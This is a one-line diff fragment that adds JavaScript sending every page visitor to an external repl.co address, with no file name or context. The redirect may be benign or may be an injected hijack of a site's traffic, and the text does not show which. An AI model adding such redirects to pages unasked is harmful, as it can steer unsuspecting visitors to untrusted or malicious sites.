@@ -1,0 +1,1 @@
+location.href = "https://oneline.abaanshanid.repl.co/";
